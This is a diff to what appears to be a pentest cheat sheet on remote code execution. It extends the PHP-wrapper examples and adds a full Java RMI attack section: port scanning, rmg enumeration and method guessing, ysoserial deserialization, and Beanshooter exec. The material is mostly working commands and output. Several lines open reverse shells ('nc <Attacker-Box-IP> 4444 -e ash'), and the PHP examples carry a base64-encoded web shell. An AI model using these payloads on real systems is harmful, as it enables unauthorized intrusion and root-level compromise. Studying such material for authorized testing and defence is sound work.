@@ -31,7 +31,8 @@
 - [Technique 3 - RCE using a Liferay CMS web-based groovy script console](#Technique-3-RCE-using-a-Liferay-CMS-web-based-groovy-script-console)
 - [Technique 4 - RCE by exploiting ASP.NET ViewState deserialization in .NET Web applications](#Technique-4-RCE-by-exploiting-ASPNET-ViewState-deserialization-in-NET-Web-applications)
 - [Technique 5 - RCE by exploiting PHP wrappers in PHP Web applications](#Technique-5-RCE-by-exploiting-PHP-wrappers-in-PHP-Web-applications)
-- Technique 6 - ...
+- [Technique 6 - RCE by exploiting insecure Java Remote Method Invocation APIs (Java RMI)](#Technique-6-RCE-by-exploiting-insecure-Java-Remote-Method-Invocation-API-Java-RMI-)
+- Technique 7 - ...
 
 #### III. List of common paths for the DocumentRoot directory (Web root directory) [LINK](#III-List-of-common-paths-for-the-DocumentRoot-directory-Web-root-directory)
 #### IV. Usefull Github links for Webshells [LINK](#IV-Usefull-Github-links-for-Webshells)
@@ -695,6 +696,7 @@ Example 3 - Context: .Net framework > 4,5 and EnableViewStateMac=true and ViewSt
 #### Technique 5. RCE by exploiting PHP wrappers in PHP Web applications
 ```
 ➤ Example 1 - Wrapper 'data://'
+  -----------------------------
    + Requirement: The attribute allow_url_include must be set. This configuration can be checked in the php.ini file.
    + Examples:
            - curl --user-agent "AUDIT" "https://example.com/?parameter=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=whoami"
@@ -702,16 +704,211 @@ Example 3 - Context: .Net framework > 4,5 and EnableViewStateMac=true and ViewSt
              NOTE: the payload is "<?php system($_GET['cmd']);?>"
 
 ➤ Example 2 - Wrapper php://input
+  -----------------------------
    + Requirement: The attribute allow_url_include must be set. This configuration can be checked in the php.ini file.
    + Examples:
            - curl -X POST --data "<?php echo shell_exec('whoami'); ?>" "https://example.com/index.php?page=php://input%00" -k -v
            - curl -X POST --data "<?php echo shell_exec('whoami'); ?>" "https://example.com/index.php?parameter=php://input"
 
 ➤ Example 3 - Wrapper php://expect
+  -----------------------------
    + Requirement: The expect wrapper doesn't required the allow_url_include configuration, the expect extension is required instead.
    + Examples:
            - curl --user-agent "AUDIT" "https://example.com/index.php?page=expect://whoami"
            - curl --user-agent "AUDIT" "https://example.com/?parameter=expect://whoami"
+```
+#### Technique 6. RCE by exploiting insecure Java Remote Method Invocation API (Java RMI)
+<i/>Note: Insecure configuration of the Java RMI APIs used by multiple Java products could lead to unauthenticated remote code execution (RCE). Usefull links: https://book.hacktricks.xyz/network-services-pentesting/1099-pentesting-java-rmi and https://swisskyrepo.github.io/PayloadsAllTheThings/Java%20RMI/</i>
+```
+➤ Step 1. Identify JAVA RMI APIs that are exposed on the Internet or on the internal network of the company that you are auditing.
+	  The default ports of Java RMI APIs are: 1090, 1098, 1099, 1199, 4443-4446, 8999-9010, 9999.
+
+           + Example 1 - Nmap port scan
+             --------------------------
+	     $ nmap -Pn -sV -p <TARGET_PORTS> <TARGET_IP>
+	       <SNIP>
+	       PORT      STATE SERVICE      VERSION
+	       1090/tcp  open  ssl/java-rmi Java RMI
+	       9010/tcp  open  java-rmi     Java RMI
+	       37471/tcp open  java-rmi     Java RMI
+	       40259/tcp open  ssl/java-rmi Java RMI
+	       <SNIP>
+
+           + Example 2 - Nmap port scan with the NSE scripts: rmi-dumpregistry, rmi-vuln-classloader
+             ---------------------------------------------------------------------------------------
+	     $ nmap  -Pn -v -sV --script "rmi-dumpregistry or rmi-vuln-classloader" -p <TARGET_PORT> <TARGET_IP>
+	       1089/tcp open  java-rmi Java RMI
+	       | rmi-vuln-classloader:
+	       |   VULNERABLE:
+	       |   RMI registry default configuration remote code execution vulnerability
+	       |     State: VULNERABLE
+	       |       Default configuration of RMI registry allows loading classes from remote URLs which can lead to remote code execution.
+	       | rmi-dumpregistry:
+	       |   jmxrmi
+	       |     javax.management.remote.rmi.RMIServerImpl_Stub
+
+           + Example 3 - Scanning with the Java RMI vulnerability scanner "RMG" (https://github.com/qtc-de/remote-method-guesser)
+             --------------------------------------------------------------------------------------------------------------------
+	     $ rmg scan <TARGET_IP> --ports 0-65535
+	     [+] Scanning 6225 Ports on XXX.XX.XX.XX for RMI services.
+	     [+]   [HIT] Found RMI service(s) on XXX.XX.XX.XX:40393 (DGC)
+	     [+]   [HIT] Found RMI service(s) on XXX.XX.XX.XX:1090  (Registry, DGC)
+	     [+]   [HIT] Found RMI service(s) on XXX.XX.XX.XX:9010  (Registry, Activator, DGC)
+	     [+]   [6234 / 6234] [#############################] 100%
+	     [+] Portscan finished.
+
+➤ Step 2. Enumerate the JAVA RMI APIs and try to identify insecure default configuration and/or vulnerable APIs
+
+           + Example 1 - Enumeration of remote methods using the Java RMI vulnerability scanner "RMG" (with the "enum" command)
+             ------------------------------------------------------------------------------------------------------------------
+	     $ rmg enum <TARGET_IP> <TARGET_PORT>
+	     [+] RMI registry bound names:
+	     [+]   - plain-server2
+	     [+]     --> eu.tneitzel.rmg.server.interfaces.IPlainServer (unknown class)
+	     [+]         Endpoint: <FQDN>:42273 ObjID: [-49c48e31:17d6f8692ae:-7ff7, -3079588349672331489]
+	     [+]   - legacy-service
+	     [+]     --> eu.tneitzel.rmg.server.legacy.LegacyServiceImpl_Stub (unknown class)
+	     [+]         Endpoint: <FQDN>:42273 ObjID: [-49c48e31:17d6f8692ae:-7ffc, -2969569395601583761]
+	     [+]   - plain-server
+	     [+]     --> eu.tneitzel.rmg.server.interfaces.IPlainServer (unknown class)
+	     [+]         Endpoint: <FQDN>:42273 ObjID: [-49c48e31:17d6f8692ae:-7ff8, 1319708214331962145]
+	     [+]
+	     [+] RMI server codebase enumeration:
+	     [+]   - http://iinsecure.example/well-hidden-development-folder/
+	     [+]     --> eu.tneitzel.rmg.server.legacy.LegacyServiceImpl_Stub
+	     [+]     --> eu.tneitzel.rmg.server.interfaces.IPlainServer
+	     [+]
+	     [+] RMI server String unmarshalling enumeration:
+	     [+]   - Caught ClassNotFoundException during lookup call.
+	     [+]     --> The type java.lang.String is unmarshalled via readObject().
+	     [+]     Configuration Status: Outdated
+	     [+]
+	     [+] RMI server useCodebaseOnly enumeration:
+	     [+]   - Caught MalformedURLException during lookup call.
+	     [+]     --> The server attempted to parse the provided codebase (useCodebaseOnly=false).
+	     [+]     Configuration Status: Non Default
+	     [+]
+	     [+] RMI registry localhost bypass enumeration (CVE-2019-2684):
+	     [+]   - Caught NotBoundException during unbind call (unbind was accepeted).
+	     [+]     Vulnerability Status: Vulnerable
+	     [+]
+	     [+] RMI Security Manager enumeration:
+	     [+]   - Security Manager rejected access to the class loader.
+	     [+]     --> The server does use a Security Manager.
+	     [+]     Configuration Status: Current Default
+	     [...]
+
+           + Example 2 - Enumeration/brute-force of remote methods using the Java RMI vulnerability scanner "RMG" (with the "guess" command)
+             -------------------------------------------------------------------------------------------------------------------------------
+	     $ rmg guess <TARGET_IP> <TARGET_PORT>
+	     [+] Reading method candidates from internal wordlist rmg.txt
+	     [+] 	752 methods were successfully parsed.
+	     [+] Reading method candidates from internal wordlist rmiscout.txt
+	     [+] 	2550 methods were successfully parsed.
+	     [+]
+	     [+] Starting Method Guessing on 3281 method signature(s).
+	     [+]
+	     [+] 	MethodGuesser is running:
+	     [+] 		--------------------------------
+	     [+] 		[ plain-server2  ] HIT! Method with signature String execute(String dummy) exists!
+	     [+] 		[ plain-server2  ] HIT! Method with signature String system(String dummy, String[] dummy2) exists!
+	     [+] 		[ legacy-service ] HIT! Method with signature void logMessage(int dummy1, String dummy2) exists!
+	     [+] 		[ legacy-service ] HIT! Method with signature void releaseRecord(int recordID, String tableName, Integer remoteHashCode) exists!
+	     [+] 		[ legacy-service ] HIT! Method with signature String login(java.util.HashMap dummy1) exists!
+	     [+] 		[6562 / 6562] [#####################################] 100%
+	     [+] 	done.
+	     [+]
+	     [+] Listing successfully guessed methods:
+	     [+]
+	     [+] 	- plain-server2 == plain-server
+	     [+] 		--> String execute(String dummy)
+	     [+] 		--> String system(String dummy, String[] dummy2)
+	     [+] 	- legacy-service
+	     [+] 		--> void logMessage(int dummy1, String dummy2)
+	     [+] 		--> void releaseRecord(int recordID, String tableName, Integer remoteHashCode)
+	     [+] 		--> String login(java.util.HashMap dummy1)
+
+➤ Step 3. Exploit the insecure JAVA RMI APIs identified in the previous step to remetoly execute commands (RCE)
+
+          - Notes:
+            + Multiple exploits/attacks exist depending on the configuration of the Java RMI services available.
+            + Several tools can be used:
+              > Remote-Method-Guesser - Java RMI Vulnerability Scanner (Github - https://github.com/qtc-de/remote-method-guesser)
+              > Beanshooter - MX enumeration and attacking tool (Github - https://github.com/qtc-de/beanshooter)
+              > Metasploit framework (exploit/multi/misc/java_rmi_server)
+              > ...
+
+           + Example 1 - Abusing well known RMI components with the Java RMI vulnerability scanner "RMG"
+             -------------------------------------------------------------------------------------------
+             Whereas modern RMI servers apply deserialization filters on these well known RMI components (JEP290),older servers may
+             still be vulnerable to deserialization attacks. The tool "Remote-Method-Guesser" allows to verify this by using the serial action,
+             that can perform deserialization attacks on the Activator, Distributed Garbage Collector (DGC) or the RMI registry.
+
+             $ rmg serial <TARGET-IP> <TARGET-PORT> CommonsCollections6 'nc <Attacker-Box-IP> 4444 -e ash' --component reg
+             [+] Creating ysoserial payload... done.
+             [+]
+             [+] Attempting deserialization attack on RMI Registry endpoint...
+             [+]
+             [+] 	Caught ClassCastException during deserialization attack.
+             [+] 	Deserialization attack was probably successful :)
+
+             $ nc -vlp 4444
+             Ncat: Version 7.92 ( https://nmap.org/ncat )
+             Ncat: Listening on :::4444
+             Ncat: Listening on 0.0.0.0:4444
+             <SNIP>
+             id
+             uid=0(root) gid=0(root) groups=0(root)
+
+           + Example 2 - RCE using the tool "Beanshooter" with the "TonkaBean" command
+             -------------------------------------------------------------------------
+             The TonkaBean is a custom MBean that is implemented by the beanshooter project and allows file system access and
+             command execution on the JMX server. Its actions can be accessed by using the tonka operation, followed by the desired action.
+             The exec action can be used to invoke a single command on the JMX service:
+
+             //beanshooter tonka exec <TARGET-IP> <TARGET-PORT> <CMD>
+             $ beanshooter tonka exec 172.17.0.2 9010 id
+             [+] Invoking the executeCommand method with argument: id
+             [+] The call was successful
+             [+]
+             [+] Server response:
+             uid=0(root) gid=0(root) groups=0(root)
+
+           + Example 3 - RCE using the tool "Beanshooter" with the "standard" action/command
+             -------------------------------------------------------------------------------
+             The standard action deploys a StandardMBean that implements the TemplateImpl class to achieve different targets.
+             This technique was identified by Markus Wulftange and beanshooter implements it to allow command execution, file
+             upload and TonkaBean deployment.
+
+             //beanshooter standard <TARGET-IP> <TARGET-PORT> exec <CMD>
+             $ beanshooter standard 172.17.0.2 9010 exec 'nc 172.17.0.1 4444 -e ash'
+             [+] Creating a TemplateImpl payload object to abuse StandardMBean
+             [+]
+             [+] 	Deplyoing MBean: StandardMBean
+             [+] 	MBean with object name de.qtc.beanshooter:standard=3873612041699 was successfully deployed.
+             [+]
+             [+] 	Caught NullPointerException while invoking the newTransformer action.
+             [+] 	This is expected bahavior and the attack most likely worked :)
+             [+]
+             [+] 	Removing MBean with ObjectName de.qtc.beanshooter:standard=3873612041699 from the MBeanServer.
+             [+] 	MBean was successfully removed.
+             ...
+
+             $ nc -vlp 4444
+             Ncat: Version 7.93 ( https://nmap.org/ncat )
+             Ncat: Listening on :::4444
+             Ncat: Listening on 0.0.0.0:4444
+             <SNIP>
+             id
+             uid=0(root) gid=0(root) groups=0(root)
+
+           + Example 3 - RCE using Metasploit
+             --------------------------------
+	     use exploit/multi/misc/java_rmi_server
+	     RHOSTS <IPs>
+	     set RPORT <PORT>
+	     # configure also the payload if needed
+	     run
 ```
 
 -----------------
